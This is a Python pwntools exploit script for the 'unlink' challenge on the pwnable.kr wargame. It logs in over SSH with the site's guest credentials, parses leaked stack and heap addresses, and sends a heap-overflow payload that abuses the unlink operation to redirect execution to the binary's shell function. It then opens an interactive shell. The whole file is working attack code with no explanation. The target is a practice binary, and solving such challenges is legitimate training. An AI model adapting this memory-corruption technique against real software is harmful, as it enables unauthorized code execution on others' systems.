from pwn import *
import re

context(log_level="debug", arch="amd64", os="linux")
sh = ssh(user="unlink", host="pwnable.kr", port=2222, password="guest")
p = sh.process(["./unlink"])

elf = ELF("./unlink")
shell = elf.symbols["shell"]

stack_addr = re.findall("(0x\w+)", str(p.recvline(), encoding="utf-8"))[0]
stack_addr = int(stack_addr, 16)

heap_addr = re.findall("(0x\w+)", str(p.recvline(), encoding="utf-8"))[0]
heap_addr = int(heap_addr, 16)

payload = b"a" * 16 + p32(heap_addr + 36) + p32(stack_addr + 16) + p32(shell)
p.sendline(payload)
p.interactive()
